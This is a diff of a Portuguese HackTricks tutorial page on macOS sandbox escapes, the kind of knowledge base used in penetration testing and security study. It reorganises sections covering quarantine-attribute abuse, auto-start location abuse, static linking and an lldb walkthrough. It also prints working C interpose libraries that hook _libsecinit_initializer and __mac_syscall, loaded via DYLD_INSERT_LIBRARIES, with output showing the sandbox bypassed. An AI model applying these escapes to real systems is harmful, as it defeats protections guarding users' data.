@@ -8,7 +8,7 @@
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
@@ -25,17 +25,143 @@ Por fim, o sandbox será ativado com uma chamada para **`__sandbox_ms`**, que ch
 
 ## Possíveis Bypasses
 
-{% hint style="warning" %}
-Observe que **arquivos criados por processos em sandbox** recebem o **atributo de quarentena** para evitar a fuga do sandbox.
-{% endhint %}
+### Bypass do atributo de quarentena
 
-### Executar binário sem Sandbox
+**Arquivos criados por processos em sandbox** recebem o **atributo de quarentena** para evitar a fuga do sandbox. No entanto, se você conseguir **criar um pacote `.app` sem o atributo de quarentena** dentro de um aplicativo em sandbox, você pode fazer com que o binário do pacote do aplicativo aponte para **`/bin/bash`** e adicionar algumas variáveis de ambiente no **plist** para abusar do launchctl e **iniciar o novo aplicativo sem sandbox**.
 
-Se você executar um binário que não será colocado em sandbox a partir de um binário em sandbox, ele **será executado dentro do sandbox do processo pai**.
+Isso é o que foi feito em [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
 
-### Depurar e burlar o Sandbox com lldb
+### Abuso da funcionalidade Open
 
-Vamos compilar um aplicativo que deve ser colocado em sandbox:
+Nos [**últimos exemplos de bypass do sandbox do Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv), pode-se apreciar como a funcionalidade **`open`** do cli pode ser abusada para contornar o sandbox.
+
+### Abuso de Locais de Início Automático
+
+Se um processo em sandbox pode **escrever** em um local onde **posteriormente um aplicativo sem sandbox vai executar o binário**, ele será capaz de **escapar apenas colocando** o binário lá. Um bom exemplo desse tipo de locais são `~/Library/LaunchAgents` ou `/System/Library/LaunchDaemons`.
+
+Para isso, você pode precisar de **2 etapas**: fazer um processo com um **sandbox mais permissivo** (`file-read*`, `file-write*`) executar seu código, que na verdade irá escrever em um local onde será **executado sem sandbox**.
+
+Confira esta página sobre **Locais de Início Automático**:
+
+{% content-ref url="../../../../macos-auto-start-locations.md" %}
+[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
+{% endcontent-ref %}
+
+### Abuso de outros processos
+
+Se a partir do processo em sandbox você conseguir **comprometer outros processos** em execução em sandboxes menos restritivas (ou sem sandbox), você será capaz de escapar para seus sandboxes:
+
+{% content-ref url="../../../macos-proces-abuse/" %}
+[macos-proces-abuse](../../../macos-proces-abuse/)
+{% endcontent-ref %}
+
+### Compilação Estática e Vinculação Dinâmica
+
+[**Esta pesquisa**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) descobriu 2 maneiras de contornar o Sandbox. Como o sandbox é aplicado a partir do espaço do usuário quando a biblioteca **libSystem** é carregada. Se um binário pudesse evitar o carregamento dela, ele nunca seria colocado em sandbox:
+
+* Se o binário fosse **completamente compilado estaticamente**, ele poderia evitar o carregamento dessa biblioteca.
+* Se o **binário não precisasse carregar nenhuma biblioteca** (porque o linker também está em libSystem), ele não precisaria carregar libSystem.&#x20;
+
+### Shellcodes
+
+Observe que **até mesmo shellcodes** em ARM64 precisam ser vinculados em `libSystem.dylib`:
+```bash
+ld -o shell shell.o -macosx_version_min 13.0
+ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
+```
+### Entitlements
+
+Observe que mesmo que algumas **ações** possam ser **permitidas pelo sandbox** se um aplicativo tiver uma **autorização específica**, como em:
+```scheme
+(when (entitlement "com.apple.security.network.client")
+(allow network-outbound (remote ip))
+(allow mach-lookup
+(global-name "com.apple.airportd")
+(global-name "com.apple.cfnetwork.AuthBrokerAgent")
+(global-name "com.apple.cfnetwork.cfnetworkagent")
+[...]
+```
+### Bypassando o Interpost
+
+Para obter mais informações sobre o **Interpost**, consulte:
+
+{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
+[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
+{% endcontent-ref %}
+
+#### Interpostar `_libsecinit_initializer` para evitar o sandbox
+```c
+// gcc -dynamiclib interpose.c -o interpose.dylib
+
+#include <stdio.h>
+
+void _libsecinit_initializer(void);
+
+void overriden__libsecinit_initializer(void) {
+printf("_libsecinit_initializer called\n");
+}
+
+__attribute__((used, section("__DATA,__interpose"))) static struct {
+void (*overriden__libsecinit_initializer)(void);
+void (*_libsecinit_initializer)(void);
+}
+_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
+```
+
+```bash
+DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
+_libsecinit_initializer called
+Sandbox Bypassed!
+```
+#### Interceptar `__mac_syscall` para evitar o Sandbox
+
+{% code title="interpose.c" %}
+```c
+// gcc -dynamiclib interpose.c -o interpose.dylib
+
+#include <stdio.h>
+#include <string.h>
+
+// Forward Declaration
+int __mac_syscall(const char *_policyname, int _call, void *_arg);
+
+// Replacement function
+int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
+printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
+if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
+printf("Bypassing Sandbox initiation.\n");
+return 0; // pretend we did the job without actually calling __mac_syscall
+}
+// Call the original function for other cases
+return __mac_syscall(_policyname, _call, _arg);
+}
+
+// Interpose Definition
+struct interpose_sym {
+const void *replacement;
+const void *original;
+};
+
+// Interpose __mac_syscall with my_mac_syscall
+__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
+{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
+};
+```
+{% endcode %}
+```bash
+DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
+
+__mac_syscall invoked. Policy: Sandbox, Call: 2
+__mac_syscall invoked. Policy: Sandbox, Call: 2
+__mac_syscall invoked. Policy: Sandbox, Call: 0
+Bypassing Sandbox initiation.
+__mac_syscall invoked. Policy: Quarantine, Call: 87
+__mac_syscall invoked. Policy: Sandbox, Call: 4
+Sandbox Bypassed!
+```
+### Depurar e contornar o Sandbox com lldb
+
+Vamos compilar um aplicativo que deve ser colocado em um sandbox:
 
 {% tabs %}
 {% tab title="sand.c" %}
@@ -56,17 +182,13 @@ system("cat ~/Desktop/del.txt");
 ```
 {% tab title="Info.plist" %}
 
-O arquivo Info.plist contém informações sobre o aplicativo e suas configurações. Ele é usado pelo macOS para determinar as permissões e restrições do aplicativo quando executado no ambiente de sandbox. O arquivo Info.plist deve ser incluído no pacote do aplicativo e deve seguir a estrutura e as chaves definidas pela Apple.
+O arquivo Info.plist contém informações sobre o aplicativo, como seu nome, versão e identificador exclusivo. Ele também pode conter configurações relacionadas à segurança e privilégios do aplicativo. O Info.plist é um arquivo de propriedades XML que está localizado dentro do pacote do aplicativo macOS.
 
-Aqui estão algumas chaves importantes que podem ser definidas no arquivo Info.plist para configurar o comportamento do aplicativo no sandbox:
+Ao desenvolver um aplicativo para macOS, é importante considerar as configurações de segurança no arquivo Info.plist. Essas configurações podem ajudar a proteger o aplicativo contra ameaças de segurança e limitar os privilégios do aplicativo.
 
-- `com.apple.security.app-sandbox`: Esta chave define se o aplicativo será executado no sandbox. Defina o valor como `true` para habilitar o sandboxing.
-- `com.apple.security.network.client`: Esta chave define se o aplicativo pode fazer conexões de rede. Defina o valor como `true` para permitir conexões de rede.
-- `com.apple.security.files.user-selected.read-write`: Esta chave define se o aplicativo pode ler e gravar em arquivos selecionados pelo usuário. Defina o valor como `true` para permitir a leitura e gravação em arquivos selecionados pelo usuário.
-- `com.apple.security.files.downloads.read-write`: Esta chave define se o aplicativo pode ler e gravar na pasta de downloads do usuário. Defina o valor como `true` para permitir a leitura e gravação na pasta de downloads.
-- `com.apple.security.files.all`: Esta chave define se o aplicativo pode ler e gravar em todos os arquivos do usuário. Defina o valor como `true` para permitir a leitura e gravação em todos os arquivos.
+Além disso, o Info.plist também pode conter informações sobre as permissões necessárias para que o aplicativo acesse recursos do sistema, como a câmera, o microfone ou os dados do usuário. Essas permissões podem ser especificadas usando as chaves NSCameraUsageDescription, NSMicrophoneUsageDescription e NSUserTrackingUsageDescription, respectivamente.
 
-Essas são apenas algumas das chaves disponíveis para configurar o sandboxing no macOS. Consulte a documentação da Apple para obter mais informações sobre as chaves disponíveis e suas configurações.
+É importante revisar e configurar corretamente o arquivo Info.plist para garantir que o aplicativo esteja adequadamente protegido e tenha os privilégios necessários para funcionar corretamente no macOS.
 
 {% endtab %}
 ```xml
@@ -97,14 +219,14 @@ codesign -s <cert-name> --entitlements entitlements.xml sand
 {% endcode %}
 
 {% hint style="danger" %}
-O aplicativo tentará **ler** o arquivo **`~/Desktop/del.txt`**, o que o **Sandbox não permitirá**.\
-Crie um arquivo lá, pois uma vez que o Sandbox for contornado, ele poderá lê-lo:
+O aplicativo tentará **ler** o arquivo **`~/Desktop/del.txt`**, o qual o **Sandbox não permitirá**.\
+Crie um arquivo lá, pois uma vez que o Sandbox seja contornado, ele poderá lê-lo:
 ```bash
 echo "Sandbox Bypassed" > ~/Desktop/del.txt
 ```
 {% endhint %}
 
-Vamos depurar a aplicação para ver quando o Sandbox é carregado:
+Vamos depurar o aplicativo para ver quando o Sandbox é carregado:
 ```bash
 # Load app in debugging
 lldb ./sand
@@ -184,130 +306,6 @@ Processo 2517 saiu com status = 0 (0x00000000)
 **Mesmo com o Sandbox contornado, o TCC** perguntará ao usuário se ele deseja permitir que o processo leia arquivos da área de trabalho.
 {% endhint %}
 
-### Abusando de outros processos
-
-Se a partir do processo do sandbox você conseguir **comprometer outros processos** em execução em sandboxes menos restritivas (ou nenhuma), você poderá escapar para suas sandboxes:
-
-{% content-ref url="../../../macos-proces-abuse/" %}
-[macos-proces-abuse](../../../macos-proces-abuse/)
-{% endcontent-ref %}
-
-### Bypass de Interpost
-
-Para obter mais informações sobre **Interpost**, consulte:
-
-{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
-[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
-{% endcontent-ref %}
-
-#### Interceptar `_libsecinit_initializer` para evitar o sandbox
-```c
-// gcc -dynamiclib interpose.c -o interpose.dylib
-
-#include <stdio.h>
-
-void _libsecinit_initializer(void);
-
-void overriden__libsecinit_initializer(void) {
-printf("_libsecinit_initializer called\n");
-}
-
-__attribute__((used, section("__DATA,__interpose"))) static struct {
-void (*overriden__libsecinit_initializer)(void);
-void (*_libsecinit_initializer)(void);
-}
-_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
-```
-
-```bash
-DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
-_libsecinit_initializer called
-Sandbox Bypassed!
-```
-#### Interceptar `__mac_syscall` para evitar o Sandbox
-
-{% code title="interpose.c" %}
-```c
-// gcc -dynamiclib interpose.c -o interpose.dylib
-
-#include <stdio.h>
-#include <string.h>
-
-// Forward Declaration
-int __mac_syscall(const char *_policyname, int _call, void *_arg);
-
-// Replacement function
-int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
-printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
-if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
-printf("Bypassing Sandbox initiation.\n");
-return 0; // pretend we did the job without actually calling __mac_syscall
-}
-// Call the original function for other cases
-return __mac_syscall(_policyname, _call, _arg);
-}
-
-// Interpose Definition
-struct interpose_sym {
-const void *replacement;
-const void *original;
-};
-
-// Interpose __mac_syscall with my_mac_syscall
-__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
-{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
-};
-```
-{% endcode %}
-```bash
-DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
-
-__mac_syscall invoked. Policy: Sandbox, Call: 2
-__mac_syscall invoked. Policy: Sandbox, Call: 2
-__mac_syscall invoked. Policy: Sandbox, Call: 0
-Bypassing Sandbox initiation.
-__mac_syscall invoked. Policy: Quarantine, Call: 87
-__mac_syscall invoked. Policy: Sandbox, Call: 4
-Sandbox Bypassed!
-```
-### Compilação estática e vinculação dinâmica
-
-[**Esta pesquisa**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) descobriu 2 maneiras de contornar o Sandbox. Isso ocorre porque o sandbox é aplicado a partir do espaço do usuário quando a biblioteca **libSystem** é carregada. Se um binário pudesse evitar o carregamento dela, ele nunca seria colocado em um sandbox:
-
-* Se o binário fosse **completamente compilado de forma estática**, ele poderia evitar o carregamento dessa biblioteca.
-* Se o **binário não precisasse carregar nenhuma biblioteca** (porque o vinculador também está em libSystem), ele não precisaria carregar libSystem.&#x20;
-
-### Shellcodes
-
-Observe que **mesmo shellcodes** em ARM64 precisam ser vinculados em `libSystem.dylib`:
-```bash
-ld -o shell shell.o -macosx_version_min 13.0
-ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
-```
-### Privilégios
-
-Note que mesmo que algumas **ações** possam ser **permitidas pelo sandbox** se um aplicativo tiver um **privilégio específico**, como em:
-```scheme
-(when (entitlement "com.apple.security.network.client")
-(allow network-outbound (remote ip))
-(allow mach-lookup
-(global-name "com.apple.airportd")
-(global-name "com.apple.cfnetwork.AuthBrokerAgent")
-(global-name "com.apple.cfnetwork.cfnetworkagent")
-[...]
-```
-### Explorando Locais de Início Automático
-
-Se um processo em sandbox pode **escrever** em um local onde **mais tarde um aplicativo sem sandbox será executado**, ele será capaz de **escapar simplesmente colocando** o binário lá. Um bom exemplo desse tipo de local é `~/Library/LaunchAgents` ou `/System/Library/LaunchDaemons`.
-
-Para isso, você pode precisar de **2 etapas**: fazer um processo com um sandbox **mais permissivo** (`file-read*`, `file-write*`) executar seu código, que irá realmente escrever em um local onde será **executado sem sandbox**.
-
-Verifique esta página sobre **locais de início automático**:
-
-{% content-ref url="../../../../macos-auto-start-locations.md" %}
-[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
-{% endcontent-ref %}
-
 ## Referências
 
 * [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
@@ -321,7 +319,7 @@ Verifique esta página sobre **locais de início automático**:
 * Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo Telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
